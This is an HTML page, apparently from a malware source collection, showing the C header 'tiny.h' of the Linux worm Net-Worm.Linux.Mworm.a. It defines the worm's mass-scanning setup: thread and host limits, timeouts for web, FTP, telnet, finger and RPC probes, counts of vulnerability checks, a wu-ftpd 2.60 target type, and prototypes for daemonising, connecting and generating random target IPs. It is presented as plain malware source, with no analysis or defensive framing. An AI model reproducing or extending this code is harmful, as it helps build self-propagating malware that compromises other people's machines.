<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Linux.Mworm.a - tiny.h.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;net/if.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;rpc/rpc.h&gt;
#include &lt;rpc/pmap_prot.h&gt;
#include &lt;rpc/pmap_clnt.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;ctype.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;arpa/nameser.h&gt;
#include &lt;getopt.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;netinet/ip.h&gt;
</span><span class="sc2">//#include &lt;netinet/tcp.h&gt;
</span><span class="sc9">#include &lt;netinet/udp.h&gt;
#include &lt;netinet/ip_icmp.h&gt;
#include &lt;pthread.h&gt;
#include &lt;thread_db.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/select.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;sys/uio.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;ctype.h&gt;
</span><span class="sc0">
</span><span class="sc2">//#define DEBUG  1      //if u  want to debug define it ,else not define it 
</span><span class="sc9">#define MAXHOST          255    </span><span class="sc2">//define the scale max  host number once scan
</span><span class="sc9">#define SCANPORTNUM  11 </span><span class="sc2">//define the scan port type number
</span><span class="sc9">#define MAXTHREAD    40     </span><span class="sc2">//define the thread num once time, default=10
</span><span class="sc9">#define MIN_MULTI_NUM    1  </span><span class="sc2">//define the min of the multi, default = 1;
</span><span class="sc9">#define CONNECT_TIME     4  </span><span class="sc2">//define the connect timeout , default=2;
</span><span class="sc9">#define WEB_READTIMEOUT  4      </span><span class="sc2">//define the 80 socket read timeout , default=4
</span><span class="sc9">#define WEB_WRITETIMEOUT 4      </span><span class="sc2">//define the 80 socket write timeout , default=4
</span><span class="sc9">#define FTP_READTIMEOUT  4  </span><span class="sc2">//define the 21 socket read timeout, default=4
</span><span class="sc9">#define FTP_WRITETIMEOUT 4  </span><span class="sc2">//define the 21 socket write timeout, default=4
</span><span class="sc9">#define TELNET_READTIMEOUT 2    </span><span class="sc2">//define the 23 socket read timeout ,default=4
</span><span class="sc9">#define TELNET_WRITETIMEOUT 2   </span><span class="sc2">//define the 23 socket write timeout ,default=4
</span><span class="sc9">#define FINGER_WRITETIMEOUT 6   </span><span class="sc2">//define the finger timeout
</span><span class="sc9">#define RPC_TIMEOUT  4      </span><span class="sc2">//define the create rpc timeout , default = 4
</span><span class="sc9">#define BIND_TIMEOUT     4  </span><span class="sc2">//define the bind check timeout , default = 4
</span><span class="sc9">#define CHECK_COUNT_M    19 </span><span class="sc2">//define the hole count when scan multi host, default=13
</span><span class="sc9">#define CHECK_COUNT_S    426    </span><span class="sc2">//define all the check count ,if u add one type ,please modify it
</span><span class="sc9">#define H_CONNECTING     1
#define H_NONE       0
#define H_TESTING    2
#define H_DONE       3
#define H_JOINED     4
#define WU_FTP_260   1      </span><span class="sc2">//define the wu_ftp ver 2.60 type
</span><span class="sc9">#define  LISTENQ        1       </span><span class="sc1">/* listen() backlog */</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">h_name</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">h_network</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h_port</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h_flags</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h_tid</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc11">host</span><span class="sc10">[</span><span class="sc11">MAXHOST</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">HostNumber</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">daemon_init</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">sig_chid</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">signo</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">writen</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">vptr</span><span class="sc10">,</span><span class="sc11">size_t</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">readn</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">vptr</span><span class="sc10">,</span><span class="sc11">size_t</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">my_read</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc19">ptr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">readline</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">vptr</span><span class="sc10">,</span><span class="sc11">size_t</span><span class="sc0"> </span><span class="sc11">maxlen</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">want_n</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">TCP_listen</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">TCP_connect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Remote</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">TCP_NB_connect</span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">host_net</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nsec</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">UDP_NB_connect</span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">host_net</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nsec</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">readable_timeo</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sec</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//check if is readable , sec is the timeout time 
</span><span class="sc0">                     </span><span class="sc2">//&gt;0 express is readable
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">writeable_timeo</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sec</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//check if is writeable , sec is the timeout time 
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">create_randomIP</span><span class="sc10">();</span><span class="sc0">  </span><span class="sc2">//create a ip address, the last bit is 1</span></div></body>
</html>
